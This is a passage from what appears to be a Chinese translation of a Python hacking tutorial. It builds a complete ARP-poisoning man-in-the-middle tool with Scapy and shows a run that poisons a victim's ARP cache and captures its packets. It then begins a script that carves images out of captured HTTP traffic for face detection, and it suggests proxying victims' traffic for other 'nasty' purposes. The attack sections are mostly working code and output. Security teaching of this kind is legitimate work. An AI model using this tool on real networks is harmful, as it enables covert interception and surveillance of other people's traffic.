class="title">Arper</span>:</span></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, victim, gateway, interface=<span class="string">'en0'</span>)</span>:</span></span><br><span class="line">         <span class="keyword">pass</span></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">         <span class="keyword">pass</span></span><br><span class="line"> <span class="number">2</span> <span class="function"><span class="keyword">def</span> <span class="title">poison</span><span class="params">(self)</span>:</span></span><br><span class="line">         <span class="keyword">pass</span></span><br><span class="line"> <span class="number">3</span> <span class="function"><span class="keyword">def</span> <span class="title">sniff</span><span class="params">(self, count=<span class="number">200</span>)</span>:</span></span><br><span class="line">         <span class="keyword">pass</span></span><br><span class="line"> <span class="number">4</span> <span class="function"><span class="keyword">def</span> <span class="title">restore</span><span class="params">(self)</span>:</span></span><br><span class="line">         <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    (victim, gateway, interface) = (sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br><span class="line">    myarp = Arper(victim, gateway, interface)</span><br><span class="line">    myarp.run()</span><br></pre></td></tr></table></figure>

<p>如您所见，我们将定义一个辅助函数来获取任何给定机器的MAC地址[1]，并定义一个 <em>Arper</em> 类来 <em>poison</em> [2]、 <em>sniff</em> [3]和 <em>restore</em> [4]网络设置。让我们填充每个部分，从 <em>get_mac</em> 函数开始，该函数返回给定IP地址的MAC地址。我们需要目标机器和网关的MAC地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span><span class="params">(targetip)</span>:</span></span><br><span class="line">[<span class="number">1</span>] packet = Ether(dst=<span class="string">'ff:ff:ff:ff:ff:ff'</span>)/ARP(op=<span class="string">"who-has"</span>, pdst=targetip)</span><br><span class="line">[<span class="number">2</span>] resp, _ = srp(packet, timeout=<span class="number">2</span>, retry=<span class="number">10</span>, verbose=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">for</span> _, r <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="keyword">return</span> r[Ether].src</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>我们传入目标IP地址并创建一个数据包[1]。<em>Ether</em> 函数指定该数据包将被广播，<em>ARP</em> 函数指定对MAC地址的请求，询问每个节点是否有目标IP。我们使用Scapy函数 <em>srp</em> [2]发送数据包，该函数可以在网络层发送和接收数据包。我们在 <em>resp</em> 变量中得到答案，它应该包含目标IP的以太层源(MAC地址)。</p>
<p>接下来，让我们开始编写 <em>Arper</em> 类:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Arper</span><span class="params">()</span>:</span></span><br><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, victim, gateway, interface=<span class="string">'en0'</span>)</span>:</span></span><br><span class="line">        self.victim = victim</span><br><span class="line">        self.victimmac = get_mac(victim)</span><br><span class="line">        self.gateway = gateway</span><br><span class="line">        self.gatewaymac = get_mac(gateway)</span><br><span class="line">        self.interface = interface</span><br><span class="line">        conf.iface = interface</span><br><span class="line">        conf.verb = <span class="number">0</span></span><br><span class="line">        [<span class="number">2</span>] print(<span class="string">f'Initialized <span class="subst">&#123;interface&#125;</span>:'</span>)</span><br><span class="line">        print(<span class="string">f'Gateway (<span class="subst">&#123;gateway&#125;</span>) is at <span class="subst">&#123;self.gatewaymac&#125;</span>.'</span>)</span><br><span class="line">        print(<span class="string">f'Victim (<span class="subst">&#123;victim&#125;</span>) is at <span class="subst">&#123;self.victimmac&#125;</span>.'</span>)</span><br><span class="line">        print(<span class="string">'-'</span>*<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<p>我们用目标IP和网关IP初始化类，并指定要使用的接口(默认的是en0)[1]。我们用这些信息填充对象变量<em>interface</em>、<em>victim</em>、<em>victimmac</em>、<em>gateway</em>和<em>gatewaymac</em>，并将值打印到控制台[2]。</p>
<p>在 <em>Arper</em> 类中，我们编写了 <em>run</em> 函数，这是攻击的入口点:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">[<span class="number">1</span>] self.poison_thread = Process(target=self.poison)</span><br><span class="line">    self.poison_thread.start()</span><br><span class="line">[<span class="number">2</span>] self.sniff_thread = Process(target=self.sniff)</span><br><span class="line">    self.sniff_thread.start()</span><br></pre></td></tr></table></figure>

<p><em>run</em> 类函数执行 <em>Arper</em> 对象的主要工作。它设置并运行两个进程:一个是ARP缓存毒化[1]，另一个是让我们可以通过嗅探网络流量来监视攻击进程[2]。</p>
<p><em>poison</em> 类函数创建毒化用的数据包，并将它们发送给目标受害者和网关:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poison</span><span class="params">(self)</span>:</span></span><br><span class="line">[<span class="number">1</span>] poison_victim = ARP()</span><br><span class="line">    poison_victim.op = <span class="number">2</span></span><br><span class="line">    poison_victim.psrc = self.gateway</span><br><span class="line">    poison_victim.pdst = self.victim</span><br><span class="line">    poison_victim.hwdst = self.victimmac</span><br><span class="line">    print(<span class="string">f'ip src: <span class="subst">&#123;poison_victim.psrc&#125;</span>'</span>)</span><br><span class="line">    print(<span class="string">f'ip dst: <span class="subst">&#123;poison_victim.pdst&#125;</span>'</span>)</span><br><span class="line">    print(<span class="string">f'mac dst: <span class="subst">&#123;poison_victim.hwdst&#125;</span>'</span>)</span><br><span class="line">    print(<span class="string">f'mac src: <span class="subst">&#123;poison_victim.hwsrc&#125;</span>'</span>)</span><br><span class="line">    print(poison_victim.summary())</span><br><span class="line">    print(<span class="string">'-'</span>*<span class="number">30</span>)</span><br><span class="line">[<span class="number">2</span>] poison_gateway = ARP()</span><br><span class="line">    poison_gateway.op = <span class="number">2</span></span><br><span class="line">    poison_gateway.psrc = self.victim</span><br><span class="line">    poison_gateway.pdst = self.gateway</span><br><span class="line">    poison_gateway.hwdst = self.gatewaymac</span><br><span class="line">    print(<span class="string">f'ip src: <span class="subst">&#123;poison_gateway.psrc&#125;</span>'</span>)</span><br><span class="line">    print(<span class="string">f'ip dst: <span class="subst">&#123;poison_gateway.pdst&#125;</span>'</span>)</span><br><span class="line">    print(<span class="string">f'mac dst: <span class="subst">&#123;poison_gateway.hwdst&#125;</span>'</span>)</span><br><span class="line">    print(<span class="string">f'mac_src: <span class="subst">&#123;poison_gateway.hwsrc&#125;</span>'</span>)</span><br><span class="line">    print(poison_gateway.summary())</span><br><span class="line">    print(<span class="string">'-'</span>*<span class="number">30</span>)</span><br><span class="line">    print(<span class="string">f'Beginning the ARP poison. [CTRL-C to stop]'</span>)</span><br><span class="line">[<span class="number">3</span>] <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sys.stdout.write(<span class="string">'.'</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            send(poison_victim)</span><br><span class="line">            send(poison_gateway)</span><br><span class="line">    [<span class="number">4</span>] <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            self.restore()</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p><em>poison</em> 类函数设置我们将用来毒害受害者和网关的数据。首先，我们为受害者创建一个有毒的ARP包[1]。同样，我们为网关创建了一个有毒的ARP包[2]。我们通过发送受害者的IP地址和攻击者的MAC地址来欺骗网关。同样，我们通过发送网关的IP地址和攻击者的MAC地址来欺骗目标受害者。我们将所有这些信息打印到控制台，以便能够确定数据包的目的地和有效负载。</p>
<p>接下来，我们开始将有毒的数据包以无限循环的方式发送到它们的目的地，以确保各自的ARP缓存项在攻击期间仍然是被毒化的[3]。循环将一直继续，直到按下CTRL-C (<em>KeyboardInterrupt</em>) [4]，在这种情况下，我们将目标和网关恢复到正常状态(通过向受害者和网关发送正确的信息，撤消我们的毒化攻击)。</p>
<p>为了在攻击发生时攻击可见并记录，我们使用 <em>sniff</em> 类函数嗅探网络流量:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sniff</span><span class="params">(self, count=<span class="number">100</span>)</span>:</span></span><br><span class="line">[<span class="number">1</span>] time.sleep(<span class="number">5</span>)</span><br><span class="line">    print(<span class="string">f'Sniffing <span class="subst">&#123;count&#125;</span> packets'</span>)</span><br><span class="line">[<span class="number">2</span>] bpf_filter = <span class="string">"ip host %s"</span> % victim</span><br><span class="line">[<span class="number">3</span>] packets = sniff(count=count, filter=bpf_filter, iface=self.interface)</span><br><span class="line">[<span class="number">4</span>] wrpcap(<span class="string">'arper.pcap'</span>, packets)</span><br><span class="line">    print(<span class="string">'Got the packets'</span>)</span><br><span class="line">[<span class="number">5</span>] self.restore()</span><br><span class="line">    self.poison_thread.terminate()</span><br><span class="line">    print(<span class="string">'Finished.'</span>)</span><br></pre></td></tr></table></figure>

<p><em>sniff</em> 函数在开始嗅探之前会休眠5秒[1]，以便给毒化线程时间开始工作。它嗅探大量的数据包(缺省为100)[3]，过滤有受害者IP的数据包 [2]。一旦我们捕获了数据包，我们就将它们写入一个名为 <em>arper.pacp</em> 的文件中[4]，将ARP表恢复到原来的值[5]，并终止毒化线程。</p>
<p>最后，<em>restore</em> 类函数通过向每台机器发送正确的ARP信息，使受害机器和网关机器回到它们原来的状态:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(<span class="string">'Restoring ARP tables...'</span>)</span><br><span class="line">[<span class="number">1</span>] send(ARP(</span><br><span class="line">        op=<span class="number">2</span>,</span><br><span class="line">        psrc=self.gateway,</span><br><span class="line">        hwsrc=self.gatewaymac,</span><br><span class="line">        pdst=self.victim,</span><br><span class="line">        hwdst=<span class="string">'ff:ff:ff:ff:ff:ff'</span>),</span><br><span class="line">        count=<span class="number">5</span>)</span><br><span class="line">[<span class="number">2</span>] send(ARP(</span><br><span class="line">        op=<span class="number">2</span>,</span><br><span class="line">        psrc=self.victim,</span><br><span class="line">        hwsrc=self.victimmac,</span><br><span class="line">        pdst=self.gateway,</span><br><span class="line">        hwdst=<span class="string">'ff:ff:ff:ff:ff:ff'</span>),</span><br><span class="line">        count=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p>可以通过在 <em>poison</em> 类函数(如果按CTRL-C)或在 <em>sniff</em> 类函数(当捕获了指定数量的包时)调用 <em>restore</em> 类函数。它将网关的IP和MAC地址的原始值发送给受害者[1]，并将受害者的IP和MAC地址的原始值发送给网关[2]。</p>
<p>让我们带着这个坏小子兜一圈吧!</p>
<h3 id="Kicking-the-Tires-1"><a href="#Kicking-the-Tires-1" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>在开始之前，我们需要首先告诉本地主机，我们可以将数据包转发到网关和目标IP地址。如果你在Kali虚拟机上，在终端中输入以下命令:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<p>如果你是Apple 用户，使用以下命令:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo sysctl -w net.inet.ip.forwarding=1</span><br></pre></td></tr></table></figure>

<p>现在IP转发已经就绪，让我们启动脚本并检查目标机器的ARP缓存。在攻击的机器上运行以下命令(以root用户身份):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt; python arper.py 192.168.1.193 192.168.1.254 en0</span><br><span class="line">Initialized en0:</span><br><span class="line">Gateway (192.168.1.254) is at 20:e5:64:c0:76:d0.</span><br><span class="line">Victim (192.168.1.193) is at 38:f9:d3:63:5c:48.</span><br><span class="line">------------------------------</span><br><span class="line">ip src: 192.168.1.254</span><br><span class="line">ip dst: 192.168.1.193</span><br><span class="line">mac dst: 38:f9:d3:63:5c:48</span><br><span class="line">mac src: a4:5e:60:ee:17:5d</span><br><span class="line">ARP is at a4:5e:60:ee:17:5d says 192.168.1.254</span><br><span class="line">------------------------------</span><br><span class="line">ip src: 192.168.1.193</span><br><span class="line">ip dst: 192.168.1.254</span><br><span class="line">mac dst: 20:e5:64:c0:76:d0</span><br><span class="line">mac_src: a4:5e:60:ee:17:5d</span><br><span class="line">ARP is at a4:5e:60:ee:17:5d says 192.168.1.193</span><br><span class="line">------------------------------</span><br><span class="line">Beginning the ARP poison. [CTRL-C to stop]</span><br><span class="line">...Sniffing 100 packets</span><br><span class="line">......Got the packets</span><br><span class="line">Restoring ARP tables...</span><br><span class="line">Finished.</span><br></pre></td></tr></table></figure>

<p>太棒了!没有错误或其他奇怪的事。现在让我们在目标机器上验证攻击。当脚本在捕获100个数据包的过程中，我们使用 <em>arp</em> 命令显示受害设备上的ARP表:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MacBook-Pro:~ victim$ arp -a</span><br><span class="line">kali.attlocal.net (192.168.1.203) at a4:5e:60:ee:17:5d on en0 ifscope</span><br><span class="line">dsldevice.attlocal.net (192.168.1.254) at a4:5e:60:ee:17:5d on en0 ifscope</span><br></pre></td></tr></table></figure>

<p>您现在可以看到，可怜的受害者有一个中毒的ARP缓存，这里网关现在有与攻击计算机相同的MAC地址。从网关上方的条目中可以清楚地看到，我们正在从 192.168.1.203 进行攻击。当攻击完成捕获数据包时，您应该会在与脚本在同一目录下看到一个 <em>arper.pcap</em> 文件。当然，您可以做一些事情，例如强制目标计算机通过Burp的本地实例代理其所有流量，或者做任何其他令人讨厌的事情。您可能想要为关于pcap处理的下一节而保留该pcap文件—您永远不知道可能会发现什么!</p>
<h2 id="Pcap处理"><a href="#Pcap处理" class="headerlink" title="Pcap处理"></a>Pcap处理</h2><p>Wireshark和其他工具(如Network Miner)非常适合交互式地分析包捕获文件，但有时你会想使用Python和Scapy切片pcap文件。一些很好的例子是用捕获到的网络流量，甚至像加载先前捕获过的流量这样简单来生成模糊测试用例。</p>
<p>我们将对此进行稍微不同的解释，并尝试从HTTP流量中分离出图像文件。有了这些图像文件，我们将使用OpenCV (<a href="http://www.opencv.org/" target="_blank" rel="noopener">http://www.opencv.org/</a>)计算机视觉工具，尝试检测包含人脸的图像，以便我们可以缩小可能感兴趣的图像范围。您可以使用前面的ARP欺骗脚本来生成pcap文件，或者您可以扩展ARP欺骗嗅探器，在目标正在浏览时对图像进行实时面部检测。</p>
<p>这个示例将执行两个独立的任务:将图像从HTTP流量中分割出来，并检测这些图像中的人脸。为了适应这一点，我们将创建两个程序，以便您可以根据手头的任务选择分别使用它们。您也可以按顺序使用这些程序，就像我们下边所做的那样。第一个程序，<em>recapper.py*，分析pcap文件，定位pcap文件中包含的流中存在的任何映像内容，并将这些映像写入磁盘。第二个程序 *detect .py</em> 分析每个图像文件，以确定其中是否包含人脸。如果是，它就将新图像写入磁盘，并在图像中的每个面部周围添加一个框。</p>
<p>让我们从插入执行pcap分析所需的代码开始。在下面的代码中，我们将使用一个命名元组(<em>namedtuple</em>)，这是一个Python数据结构，它的字段可以通过属性查找来访问。标准元组允许您存储一系列不可变值;它们除了不能改变元组的值几乎像列表一样。标准元组使用数字索引来访问其成员:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">point = (<span class="number">1.1</span>, <span class="number">2.5</span>)</span><br><span class="line">print(point[<span class="number">0</span>], point[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>另一方面，<em>namedtuple</em> 的操作与常规元组相同，只是它也可以通过名称访问字段。这使得代码更具可读性，并且比字典更节省内存。创建 <em>namedtuple</em> 的语法要求是两个参数:元组的名称和用空格分隔的字段名的列表。例如，假设你想创建一个名为 Point 的数据结构，它有两个属性:x和y。你可以这样定义它:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Point = namedtuple(<span class="string">'Point'</span>, [<span class="string">'x'</span>, <span class="string">'y'</span>])</span><br></pre></td></tr></table></figure>

<p>然后，您可以使用代码 <code>p = Point(35,65)</code> 创建一个名为 p 的 <em>Point</em> 对象，并像引用类一样引用其属性:p.x和p.y引用特定Point <em>namedtuple*的x和y属性。这比引用普通元组中某些项的索引的代码更容易阅读。在我们的例子中，假设你用下面的代码创建了一个名为 *Response</em> 的 <em>namedtuple</em> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response = namedtuple(<span class="string">'Response'</span>, [<span class="string">'header'</span>, <span class="string">'payload'</span>])</span><br></pre></td></tr></table></figure>

<p>现在，您可以使用 <em>Response.header</em> 和 <em>Response.payload</em> 而不是使用普通元组的索引，这更容易理解。</p>
<p>让我们在本例中使用这些信息。我们将读取一个pcap文件，重组传输的任何图像，并将图像写入磁盘。打开 <em>recapper.py</em> 并输入以下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> TCP, rdpcap</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">[<span class="number">1</span>] OUTDIR = <span class="string">'/root/Desktop/pictures'</span></span><br><span class="line">PCAPS = <span class="string">'/root/Downloads'</span></span><br><span class="line">[<span class="number">2</span>] Response = collections.namedtuple(<span class="string">'Response'</span>, [<span class="string">'header'</span>, <span class="string">'payload'</span>])</span><br><span class="line">[<span class="number">3</span>] <span class="function"><span class="keyword">def</span> <span class="title">get_header</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">[<span class="number">4</span>] <span class="function"><span class="keyword">def</span> <span class="title">extract_content</span><span class="params">(Response, content_name=<span class="string">'image'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Recapper</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, fname)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">[<span class="number">5</span>] <span class="function"><span class="keyword">def</span> <span class="title">get_responses</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">[<span class="number">6</span>] <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, content_name)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pfile = os.path.join(PCAPS, <span class="string">'pcap.pcap'</span>)</span><br><span class="line">    recapper = Recapper(pfile)</span><br><span class="line">    recapper.get_responses()</span><br><span class="line">    recapper.write(<span class="string">'image'</span>)</span><br></pre></td></tr></table></figure>

<p>这是整个脚本的主要框架逻辑，稍后我们将添加支持函数。我们设置了导入，然后指定要输出图像的目录的位置和要读取的pcap文件的位置[1]。然后我们定义一个名为 <em>Response</em> 的 <em>namedtuple</em> ，使其具有两个属性:包 <em>header</em> 和包 <em>payload</em> [2]。我们将创建两个辅助函数来获取包头[3]并提取内容[4]，这些内容将与我们将定义的 <em>Recapper</em> 类一起使用，以重构包流中出现的图像。除了__init__， <em>Recapper</em> 类将有两个类函数： <em>get_responses</em> ，它将从pcap文件读取响应[5]; <em>write</em> ，它将把响应中包含的图像文件写入输出目录[6]。</p>
<p>让我们通过编写 <em>get_header</em> 函数来填充这个脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_header</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        header_raw = payload[:payload.index(<span class="string">b'\r\n\r\n'</span>)+<span class="number">2</span>] [<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        sys.stdout.write(<span class="string">'-'</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span> [<span class="number">2</span>]</span><br><span class="line">    header = dict(re.findall(<span class="string">r'(?P&lt;name&gt;.*?): (?P&lt;value&gt;.*?)\r\n'</span>, header_raw.decode())) [<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Content-Type'</span> <span class="keyword">not</span> <span class="keyword">in</span> header: [<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> header</span><br></pre></td></tr></table></figure>

<p><em>get_header</em> 函数获取原始的HTTP流量并输出报头。我们通过查找从头开始并以一对回车和换行对结束的payload的部分来提取头文件[1]。如果有效负载不匹配该模式，我们将得到一个 <em>ValueError</em> ，在这种情况下，我们只需向控制台写入一个破折号(-)并返回[2]。否则，我们将从已解码的payload创建一个字典(<em>header</em>)，以冒号分隔，以便键是冒号之前的部分，值是冒号之后的部分[3]。如果消息头没有名为 <em>Content-Type</em> 的键，则返回 <em>None</em> 来表示消息头不包含我们想要提取的数据[4]。现在让我们编写一个函数来从响应中提取内容:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_content</span><span class="params">(Response, content_name=<span class="string">'image'</span>)</span>:</span></span><br><span class="line">    content, content_type = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">[<span class="number">1</span>] <span class="keyword">if</span> content_name <span class="keyword">in</span> Response.header[<span class="string">'Content-Type'</span>]:</span><br><span class="line">     [<span class="number">2</span>] content_type = Response.header[<span class="string">'Content-Type'</span>].split(<span class="string">'/'</span>)[<span class="number">1</span>]</span><br><span class="line">     [<span class="number">3</span>]  content = Response.payload[Response.payload.index(<span class="string">b'\r\n\r\n'</span>)+<span class="number">4</span>:]</span><br><span class="line">     [<span class="number">4</span>] <span class="keyword">if</span> <span class="string">'Content-Encoding'</span> <span class="keyword">in</span> Response.header:</span><br><span class="line">           <span class="keyword">if</span> Response.header[<span class="string">'Content-Encoding'</span>] == <span class="string">"gzip"</span>:</span><br><span class="line">              content = zlib.decompress(Response.payload, zlib.MAX_WBITS | <span class="number">32</span>)</span><br><span class="line">           <span class="keyword">elif</span> Response.header[<span class="string">'Content-Encoding'</span>] == <span class="string">"deflate"</span>:</span><br><span class="line">              content = zlib.decompress(Response.payload)</span><br><span class="line"> [<span class="number">5</span>] <span class="keyword">return</span> content, content_type</span><br></pre></td></tr></table></figure>

<p><em>extract_content</em> 函数接受HTTP响应和我们想要提取的内容类型的名称。回想一下，<em>Response</em> 是一个 <em>namedtuple</em> ，包含两个部分:头和payload(有效负载)。</p>
<p>如果内容已经用 <em>gzip</em> 或 <em>deflate</em> 之类的工具进行了编码[4]，我们可以使用 <em>zlib</em> 模块解压缩内容。对于任何包含图像的响应，头文件将在 <em>Content-Type</em> 属性中具有名称 <em>image</em> (例如，image/png 或 image/jpg ) [1]。当这种情况发生时，我们使用头中指定的实际内容类型创建一个名为 <em>content_type</em> 的变量[2]。我们创建另一个变量来保存内容本身，即header之后的负载中的所有内容[3]。最后，返回 <em>content</em> 和 <em>content_type</em> [5]的元组。</p>
<p>完成这两个辅助函数后，让我们来填充 <em>Recapper</em> 功能:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Recapper</span>:</span></span><br><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, fname)</span>:</span></span><br><span class="line">        pcap = rdpcap(fname)</span><br><span class="line">    [<span class="number">2</span>] self.sessions = pcap.sessions()</span><br><span class="line">    [<span class="number">3</span>] self.responses = list()</span><br></pre></td></tr></table></figure>

<p>首先，用要读取的pcap文件的名称初始化对象[1]。我们利用Scapy一个优秀的特性，自动将每个TCP会话分割成一个个包含每个完整TCP流的字典[2]。最后，我们创建一个名为 <em>responses</em> 的空列表，我们将用来自pcap文件的响应填充这个列表[3]。</p>
<p>在 <em>get_responses</em> 函数中，我们将遍历数据包以找到每个单独的 <em>Response</em>，并将每个响应添加到数据包流中的响应列表中:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_responses</span><span class="params">(self)</span>:</span></span><br><span class="line">[<span class="number">1</span>] <span class="keyword">for</span> session <span class="keyword">in</span> self.sessions:</span><br><span class="line">        payload = <span class="string">b''</span></span><br><span class="line">    [<span class="number">2</span>] <span class="keyword">for</span> packet <span class="keyword">in</span> self.sessions[session]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">            [<span class="number">3</span>] <span class="keyword">if</span> packet[TCP].dport == <span class="number">80</span> <span class="keyword">or</span> 